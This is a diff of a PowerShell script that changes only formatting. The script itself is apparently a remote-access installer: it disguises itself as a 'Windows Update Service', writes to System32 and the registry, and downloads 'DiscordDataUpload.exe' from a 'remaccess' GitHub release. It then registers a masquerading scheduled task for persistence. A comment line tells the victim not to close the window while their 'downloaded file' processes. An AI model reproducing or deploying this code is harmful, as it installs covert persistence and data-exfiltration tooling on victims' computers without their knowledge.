@@ -2,21 +2,22 @@
 #Write-Host "Processing Your Downloaded File, Please Don't Close this window" -ForegroundColor Yellow -BackgroundColor Black
 $regPath = "HKLM:\Software\WindowsUpdateService"
 $userNames = '(' + ((Get-WmiObject -Class Win32_UserProfile | ForEach-Object { $_.LocalPath.Split('\')[-1] }) -join ', ') + ')'
-$exepath =  "C:/Windows/System32/DiscordDataUpload.exe"
+$exepath = "C:/Windows/System32/DiscordDataUpload.exe"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
 $messageboturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
 if (-not (Test-Path $regPath)) {
-    New-Item -Path $regPath -Force | Out-Null
+  New-Item -Path $regPath -Force | Out-Null
 }
 $existingCode = (Get-ItemProperty -Path $regPath).Code
 if ($existingCode -match '^(6|0)\d{5}$') {
-    $code = $existingCode
-} else {
-    $code = "6" + (Get-Random -Minimum 10000 -Maximum 99999)
-    Set-ItemProperty -Path $regPath -Name "Code" -Value $code
+  $code = $existingCode
+}
+else {
+  $code = "6" + (Get-Random -Minimum 10000 -Maximum 99999)
+  Set-ItemProperty -Path $regPath -Name "Code" -Value $code
 }
 if (-not (Test-Path "$regPath\Data") -or (Get-ItemProperty -Path "$regPath\Data").Data -ne "active") {
-    Set-ItemProperty -Path $regPath -Name "Data" -Value "active"
+  Set-ItemProperty -Path $regPath -Name "Data" -Value "active"
 }
 #Install WindowsUpdateService
 $scriptContent = @'
@@ -97,9 +98,10 @@ $updateservxml = @"
 # Register the task from the XML content
 $updateserv = "Windows Update Service"
 if (Get-ScheduledTask -TaskName $updateserv -ErrorAction SilentlyContinue) {
-    # Task exists, so delete it
-    Unregister-ScheduledTask -TaskName $updateserv -Confirm:$false
-} else {}
+  # Task exists, so delete it
+  Unregister-ScheduledTask -TaskName $updateserv -Confirm:$false
+}
+else {}
 Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv | Out-Null
 Start-ScheduledTask -TaskName $updateserv
 #DataUpload
@@ -110,8 +112,9 @@ Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
 # Removal of directories
 $ps1Files = @("C:\Windows\WindowsUpdateService.ps1", "C:\Windows\WindowsUpdateServiceDaemon.ps1")
 foreach ($file in $ps1Files) {
-    if (Test-Path $file -PathType Leaf) {
-        Remove-Item -Path $file -Force
-    } else {
-    }
+  if (Test-Path $file -PathType Leaf) {
+    Remove-Item -Path $file -Force
+  }
+  else {
+  }
 }
